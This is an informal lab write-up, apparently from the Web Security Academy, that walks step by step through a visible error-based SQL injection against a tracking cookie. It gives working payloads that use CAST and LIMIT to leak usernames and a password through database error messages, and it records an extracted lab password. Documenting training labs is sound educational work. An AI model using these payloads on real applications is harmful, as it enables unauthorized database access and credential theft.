## Visible error-based SQL injection
1. main url : any product==>
https://0a5b001d03abccb980e7dff300f8008a.web-security-academy.net/

2. 2. go firefox  which is connected to burp suite and and open the burp suite than go the proxy ,trun on intercept and intercept the request and select the request with tracking id and send it to repeater and then send the request to the server

TrackingId=qCJmRcFoexQIeHUu;

3. now check the response of the request and see if it shows any error message in the response. If it does, then we can use this technique to extract information from the database.

 TrackingId=qCJmRcFoexQIeHUu';
 show an error message in the response. This indicates that the application is vulnerable to SQL injection.

 4. now balance the query by adding a comment at the end of the payload to ignore the rest of the query. We can use the following payload to extract the version of the database:

  TrackingId=qCJmRcFoexQIeHUu'--;

  5. now we can use CAST() function to convert the data string to a number and use the following payload : 

   TrackingId=qCJmRcFoexQIeHUu'AND CAST((SELECT 1 ) AS int)--;
   
   after use this query site show an erron ==> argument of AND must be type boolean, not type integer Position: 62

   that means after the AND operator, we need to provide a boolean expression. We can modify the payload to use a boolean expression instead of an integer. 

   6. new query:
    TrackingId=qCJmRcFoexQIeHUu'AND 1= CAST((SELECT 1 ) AS int)--;
      
   7. now we can use the following payload to extract the table data: 
    TrackingId=qCJmRcFoexQIeHUu'AND 1= CAST((SELECT username FROM users ) AS int)--; 

    after using this query, the site shows an error ==> A'.Expected char error

    8. now remove the tracking id and use the following payload to extract the table data:
==> TrackingId='AND 1= CAST((SELECT username FROM users ) AS int)--;
aftr use this query, the site shows an error ==> more that one row returned by a subquery used as an expression


9. now use LIMIT clause to limit the number of rows returned by the subquery. We can use the following payload to extract the first username from the users table:
==>TrackingId='AND 1= CAST((SELECT username FROM users LIMIT 1) AS int)--;
then show the first username in the response. We can use this technique to extract all the usernames from the users table by changing the LIMIT clause to extract the next username. We can use the following payload to extract the second username from the users table.

10. Get the password of the first user by using the following payload:

 TrackingId='AND 1= CAST((SELECT password FROM users LIMIT 1) AS int)--;

 password = kw93wrcn9svsfce17nlc